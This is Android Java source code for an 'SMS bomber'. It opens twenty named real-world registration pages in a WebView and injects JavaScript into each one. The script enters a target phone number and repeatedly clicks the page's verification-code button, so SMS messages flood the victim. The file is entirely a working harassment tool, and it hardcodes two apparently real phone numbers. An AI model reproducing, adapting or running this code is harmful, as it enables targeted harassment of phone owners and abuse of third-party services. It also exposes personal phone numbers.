package com.example.service;

import java.net.URL;

import org.json.JSONArray;

import android.content.Context;
import android.text.StaticLayout;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class Bomber extends Thread{
	//13602433062
	String js[] = {
			"javascript:var ele = document.getElementById(\"mem-tel\");"+"ele.value = 13602433062;"		//1
			+"var ele = document.getElementById(\"get-code\");" +"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();",
			"javascript:var ele = document.getElementById(\"restphone\");"+"ele.value = 13602433062;"		//2
			+"var ele = document.getElementById(\"kk\");"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();",
			"javascript:var ele = document.getElementById(\"signmobile\");"+"ele.value = 13602433062;"		//3
			+"var ele = document.getElementById(\"sendcode\");"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();",
			"javascript:var ele = document.getElementById(\"mobile\");"+"ele.value = 13602433062;"		//4
			+"var ele = document.getElementById(\"get_checkcode\");"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();",
			"",		//5
			"javascript:var ele = document.getElementById(\"ContentPlaceHolder1_txtMobile\");"+"ele.value = 13602433062;"		//6
			+"var ele = document.getElementById(\"getmcode\");"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();",
			"javascript:var ele = document.getElementById(\"mobileIpt\");"+"ele.value = 13602433062;"		//7
			+"var ele = document.getElementById(\"sendAcodeStg\");"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();",
			"javascript:var ele = document.getElementById(\"mobile\");"+"ele.value = 13602433062;"		//8
			+"var ele = document.getElementById(\"sendtomobile\");"+"ele.click();",
			"javascript:var ele =document.getElementById(\"mobile_account\");"+"ele.value = 15626154172;"		//9
			+"var ele = document.getElementById(\"btn_send_sms\")"+"ele.click();",
			"javascript:ele.value = 1235645321871329764912;"+"var ele = document.getElementById(\"mobile\");"+"ele.value = 15626154172;"		//10
			+"var ele = document.getElementById(\"getmCheck\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"username\");"+"ele.value = 15626154172;"		//11
			+"var ele = document.getElementById(\"yzm\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"phoneReg\");"+"ele.value = 15626154172;"		//12
			+"var ele = document.getElementById(\"getAuthcode\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"txtRegUser\");"+"ele.value = 124623974;"+"var ele = document.getElementById(\"" +
			"txtMobile\");"+"ele.value = 15626154172;"+"var ele = document.getElementById(\"btnsend\");"+"ele.click();",		//13
			"javascript:var ele = document.getElementById(\"iphone\");"+"ele.value = 15626154172;"		//14
			+"var ele = document.getElementById(\"phoneMsg\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"mobilePhoneF\");"+"ele.value = 15626154172;"		//15
			+"var ele = document.getElementById(\"verifyCodeBtnF\");"+"ele.click();"+"ele.click();",
			"javascript:var ele = document.getElementById(\"mobile\");"+"ele.value = 15626154172;"		//16
			+"var ele = document.getElementById(\"SendMobile\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"user_name\");"+"ele.value = 15626154172;"		//17
			+"var ele = document.getElementById(\"sendcode\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"txtTel1\");"+"ele.value = 15626154172;"		//18
			+"var ele = document.getElementById(\"timer0Button\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"mobile\");"+"ele.value = 15626154172;"		//19
			+"var ele = document.getElementById(\"obtainMobileAuthCode\");"+"ele.click();",
			"javascript:var ele = document.getElementById(\"LoginName\");"+"ele.value = 15626154172"		//20
			+"var ele = document.getElementById(\"a_CreateMobileCode\");"+"ele.click();",
			
			
			
	};
	String url[] = {
			"http://www.souche.com/pages/minilogin.html",		//1
			"http://user.migu.cn/register/index.action",		//2
			"http://beijing.lashou.com/account/signmobile/",		//3
			"http://www.guahao.com/register/mobile",		//4
			"http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=110%201168869508&mobile=13602433062",		//5
			"http://user.52callme.com/regphone.aspx",		//6
			"http://reg.email.163.com/unireg/call.do?cmd=register.entrance&from=163navi&regPage=163",		//7
			"http://member.wangpiao.com/reg.aspx",		//8
			"http://login.haodou.com/register.php",		//9
			"http://esf.house.inhe.net/passport/register/personal?referer=aHR0cDovL2VzZi5ob3VzZS5pbmhlLm5ldC8=",		//10
			"http://www.5188call.com/reg.php",		//11
			"http://i.360.cn/reg/?src=pcw_i360&destUrl=http%3A%2F%2Fi.360.cn%2F&sb_param=2a190bf8ab9becdb7404a664ac8f347e",		//12
			"http://home.manmanbuy.com/reg.aspx",		//13
			"http://www.pengke.com/member.php?mod=register",		//14
			"https://reg.95538.cn/userreg/Default.aspx",		//15
			"http://www.instrument.com.cn/vip/Register01.aspx?registerSource=1",		//16
			"http://app.ichina.cn/index.php?app=member&act=register",		//17
			"http://reg.c-c.com/member/registers.html",		//18
			"http://highso.cn/customerRegister/showRegister.do",		//19
			"http://i.qichetong.com/authenservice/register/default.aspx"		//20
			
	};
	
	int i = 0;
	String phoneNumber;
	WebView webView;
	
	
	public Bomber(String phoneNumber, WebView webView) {
		this.phoneNumber = phoneNumber;
		this.webView = webView;
	}

	public void run(){
		while(i<js.length){
			bomb(phoneNumber, webView, url[i]);
			try {
				sleep(4000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			i++;
		}
	}
	public void bomb(String phoneNumber,WebView webView,String url){
		
	//	String url = "http://www.souche.com/pages/minilogin.html";	
		webView.getSettings().setJavaScriptEnabled(true);
		webView.setWebViewClient(new WebViewClient(){
			public void onPageFinished(WebView webView,String url){	
				super.onPageFinished(webView, url);
	/*			webView.loadUrl("javascript:"+"var ele = document.getElementById(\"mem-tel\");" +
						"ele.value = "+phoneNumber+";var ele = document.getElementById(\"get-code\");" +
						"ele.click();");		
						*/
				webView.loadUrl(js[i]);
				System.out.println(i);
			}			
		});
			
		webView.loadUrl(url);
		
//		String url2 = "http://user.migu.cn/register/index.action";
//		webView.loadUrl(url2);
	}
	
}
